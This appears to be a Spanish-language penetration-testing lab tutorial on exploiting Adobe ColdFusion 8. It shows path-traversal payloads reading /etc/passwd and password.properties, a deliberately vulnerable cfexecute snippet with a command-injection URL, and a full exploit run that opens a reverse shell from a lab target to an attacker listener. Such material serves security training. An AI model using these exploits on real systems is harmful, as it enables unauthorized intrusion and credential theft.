Ahora que sabemos que ColdFusion 8 es un objetivo, el siguiente paso es verificar si existen exploits conocidos. `Searchsploit` es una herramienta de línea de comandos para `buscar y encontrar exploits` en la Exploit Database. Es parte del proyecto Exploit Database, una organización sin fines de lucro que proporciona un repositorio público de exploits y software vulnerable. `Searchsploit` busca en la Exploit Database y devuelve una lista de exploits y sus detalles relevantes, incluyendo el nombre del exploit, su descripción y la fecha de su lanzamiento.

### Searchsploit

```r
searchsploit adobe coldfusion

------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                       | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Como sabemos, la versión de ColdFusion en ejecución es `ColdFusion 8`, y hay dos resultados de interés. Los resultados son `Adobe ColdFusion - Directory Traversal` y `Adobe ColdFusion 8 - Remote Command Execution (RCE)`.

---

## Directory Traversal

`Directory/Path Traversal` es un ataque que permite a un atacante acceder a archivos y directorios fuera del directorio previsto en una aplicación web. El ataque explota la falta de validación de entrada en una aplicación web y puede ser ejecutado a través de varios `campos de entrada` como `parámetros de URL`, `campos de formulario`, `cookies`, y más. Al manipular los parámetros de entrada, el atacante puede recorrer la estructura de directorios de la aplicación web y `acceder a archivos sensibles`, incluyendo `archivos de configuración`, `datos de usuarios`, y otros archivos del sistema. El ataque puede ser ejecutado manipulando los parámetros de entrada en etiquetas de ColdFusion como `CFFile` y `CFDIRECTORY`, que se utilizan para operaciones de archivos y directorios como subir, descargar y listar archivos.

Toma el siguiente fragmento de código de ColdFusion:

```r
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
<cfloop query="fileList">
    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
</cfloop>
```

En este fragmento de código, la etiqueta de ColdFusion `cfdirectory` lista el contenido del directorio `uploads`, y la etiqueta `cfloop` se usa para recorrer los resultados de la consulta y mostrar los nombres de los archivos como enlaces clicables en HTML.

Sin embargo, el parámetro `directory` no se valida correctamente, lo que hace que la aplicación sea vulnerable a un ataque de Path Traversal. Un atacante puede explotar esta vulnerabilidad manipulando el parámetro `directory` para acceder a archivos fuera del directorio `uploads`.

```r
http://example.com/index.cfm?directory=../../../etc/&file=passwd
```

En este ejemplo, la secuencia `../` se usa para navegar por el árbol de directorios y acceder al archivo `/etc/passwd` fuera de la ubicación prevista.

`CVE-2010-2861` es el exploit `Adobe ColdFusion - Directory Traversal` descubierto por `searchsploit`. Es una vulnerabilidad en ColdFusion que permite a los atacantes realizar ataques de path traversal.

- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

Estos archivos de ColdFusion son vulnerables a un ataque de directory traversal en `Adobe ColdFusion 9.0.1` y `versiones anteriores`. Los atacantes remotos pueden explotar esta vulnerabilidad para leer archivos arbitrarios manipulando el `parámetro locale` en estos archivos específicos de ColdFusion.

Con esta vulnerabilidad, los atacantes pueden acceder a archivos fuera del directorio previsto incluyendo secuencias `../` en el parámetro de archivo. Por ejemplo, considera la siguiente URL:

```r
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en
```

En este ejemplo, la URL intenta acceder al archivo `mappings.cfm` en el directorio `/CFIDE/administrator/settings/` de la aplicación web con un `locale` especificado `en`. Sin embargo, un ataque de directory traversal puede ser ejecutado manipulando el parámetro `locale` de la URL, permitiendo a un atacante leer archivos arbitrarios ubicados fuera del directorio previsto, como archivos de configuración o archivos del sistema.

```r
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

En este ejemplo, las secuencias `../` se han usado para reemplazar un `locale` válido para recorrer la estructura de directorios y acceder al archivo `passwd` ubicado en el directorio `/etc/`.

Usando `searchsploit`, copia el exploit a un directorio de trabajo y luego ejecuta el archivo para ver qué argumentos requiere.

```r
searchsploit -p 14641

  Exploit: Adobe ColdFusion - Directory Traversal
      URL: https://www.exploit-db.com/exploits/14641
     Path: /usr/share/exploitdb/exploits/multiple/remote/14641.py
File Type: Python script, ASCII text executable

Copied EDB-ID #14641's path to the clipboard
```

### ColdFusion - Exploitation

```r
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py 

usage: 14641.py <host> <port> <file_path>
example: 14641.py localhost 80 ../../../../../../../lib/password.properties
if successful, the file will be printed
```

El archivo `password.properties` en ColdFusion es un archivo de configuración que almacena de forma segura contraseñas cifradas para varios servicios y recursos que usa el servidor ColdFusion. Contiene una lista de pares clave-valor, donde la clave representa el nombre del recurso y el valor es la contraseña cifrada. Estas contraseñas cifradas se usan para servicios como `conexiones a bases de datos`, `servidores de correo`, `servidores LDAP` y otros recursos que requieren autenticación. Al almacenar contraseñas cifradas en este archivo, ColdFusion puede recuperarlas y usarlas automáticamente para autenticarse con los respectivos servicios sin requerir la entrada manual de contraseñas cada vez. El archivo generalmente se encuentra en el directorio `[cf_root]/lib` y puede ser gestionado a través del ColdFusion Administrator.

Al proporcionar los parámetros correctos al script de exploit y especificar la ruta del archivo deseado, el script puede desencadenar un exploit en los endpoints vulnerables mencionados anteriormente. El script luego mostrará el resultado del intento de exploit:

### ColdFusion - Exploitation

```r
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
...
```

Como podemos ver, se han recuperado los contenidos del archivo `password.properties`, demostrando que este objetivo es vulnerable a `CVE-2010-2861`.

---

## Unauthenticated RCE

La ejecución remota de código no autenticada (`RCE`) es un tipo de vulnerabilidad de seguridad que permite a un atacante `ejecutar código arbitrario` en un sistema vulnerable `sin requerir autenticación`. Este tipo de vulnerabilidad puede tener consecuencias graves, ya que permitirá a un atacante `tomar el control completo del sistema` y potencialmente robar datos sensibles o causar daños al sistema.

La diferencia entre un `RCE` y una `ejecución remota de código no autenticada` es si un atacante necesita proporcionar credenciales de autenticación válidas para explotar la vulnerabilidad. Una vulnerabilidad RCE permite a un atacante ejecutar código arbitrario en un sistema objetivo, independientemente de si tiene o no credenciales válidas. Sin embargo, en muchos casos, las vulnerabilidades RCE requieren que el atacante ya tenga acceso a alguna parte del sistema, ya sea a través de una cuenta de usuario u otros medios.

En contraste, una vulnerabilidad RCE no autenticada permite a un atacante ejecutar código arbitrario en un sistema objetivo sin ninguna credencial de autenticación válida. Esto hace que este tipo de vulnerabilidad sea particularmente peligrosa, ya que un atacante puede potencialmente tomar el control de un sistema o ejecutar comandos maliciosos sin ninguna barrera de entrada.

En el contexto de aplicaciones web ColdFusion, un ataque de RCE no autenticada ocurre cuando un atacante puede ejecutar código arbitrario en el servidor sin requerir ninguna autenticación. Esto puede suceder cuando una aplicación web permite la ejecución de código arbitrario a través de una función o característica que no requiere autenticación, como una consola de depuración o una funcionalidad de carga de archivos. Toma el siguiente código:

```r
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```

En el código anterior, la variable `cmd` se crea concatenando la variable `cgi.query_string` con un comando para ejecutar. Este comando luego se ejecuta usando la función `cfexecute`, que ejecuta el programa `cmd.exe` de Windows con los argumentos especificados. Este código es vulnerable a un ataque de RCE no autenticada porque no valida correctamente la variable `cmd` antes de ejecutarla, ni requiere que el usuario esté autenticado. Un atacante podría simplemente pasar un comando malicioso como la variable `cgi.query_string`, y sería ejecutado por el servidor.

```r
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

Esta URL incluye un punto y coma (`%3B`) al comienzo de la cadena de consulta, lo que puede permitir la ejecución de múltiples comandos en el servidor. Esto podría potencialmente añadir funcionalidad legítima con un comando no deseado. El comando `echo` incluido imprime un mensaje en la consola, seguido de un comando de redirección para escribir un archivo en el directorio `C:` con un mensaje indicando que el servidor ha sido comprometido.

Un ejemplo de un ataque RCE no autenticada en ColdFusion es la vulnerabilidad `CVE-2009-2265` que afectó a las versiones de Adobe ColdFusion 8.0.1 y anteriores. Este exploit permitió a usuarios no autenticados cargar archivos y obtener ejecución remota de código en el host objetivo. La vulnerabilidad existe en el paquete FCKeditor, y es accesible en la siguiente ruta:

```r
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

`CVE-2009-2265` es la vulnerabilidad identificada en nuestra búsqueda anterior en searchsploit como `Adobe ColdFusion 8 - Remote Command Execution (RCE)`. Pásalo a un directorio de trabajo.

### Searchsploit

```r
searchsploit -p 50057

  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
File Type: Python script, ASCII text executable

Copied EDB-ID #50057cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Una revisión rápida de `cat` del código indica que el script necesita alguna información. Configura la información correcta y lanza el exploit.

### Exploit Modification

```r
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

El exploit tomará un poco de tiempo en lanzarse, pero eventualmente devolverá una shell remota funcional.

### Exploitation

```r
python3 50057.py 

Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Priting request...
Content-type: multipart/form-data; boundary=77c732cb2f394ea79c71d42d50274368
Content-length: 1698

--77c732cb2f394ea79c71d42d50274368

<SNIP>

--77c732cb2f394ea79c71d42d50274368--


Sending request and printing response...


		<script type="text/javascript">
			window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/1269fd7bd2b341fab6751ec31bbfb610.txt", "1269fd7bd2b341fab6751ec31bbfb610.txt", "0" );
		</script>
	

Printing some information for debugging...
lhost: 10.10.14.55
lport: 4444
rhost: 10.129.247.30
rport: 8500
payload: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.247.30.
Ncat: Connection from 10.129.247.30:49866.
```

### Reverse

```r
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8

 Directory of C:\ColdFusion8\runtime\bin

22/03/2017  08:53 ��    <DIR>          .
22/03/2017  08:53 ��    <DIR>          ..
18/03/2008  11:11 ��            64.512 java2wsdl.exe
19/01/2008  09:59 ��         2.629.632 jikes.exe
18/03/2008  11:11 ��            64.512 jrun.exe
18/03/2008  11:11 ��            71.680 jrunsvc.exe
18/03/2008  11:11 ��             5.120 jrunsvcmsg.dll
18/03/2008  11:11 ��            64.512 jspc.exe
22/03/2017  08:53 ��             1.804 jvm.config
18/03/2008  11:11 ��            64.512 migrate.exe
18/03/2008  11:11 ��            34.816 portscan.dll
18/03/2008  11:11 ��            64.512 sniffer.exe
18/03/2008  11:11 ��            78.848 WindowsLogin.dll
18/03/2008  11:11 ��            64.512 wsconfig.exe
22/03/2017  08:53 ��             1.013 wsconfig_jvm.config
18/03/2008  11:11 ��            64.512 wsdl2java.exe
18/03/2008  11:11 ��            64.512 xmlscript.exe
              15 File(s)      3.339.009 bytes
               2 Dir(s)   1.432.776.704 bytes free
```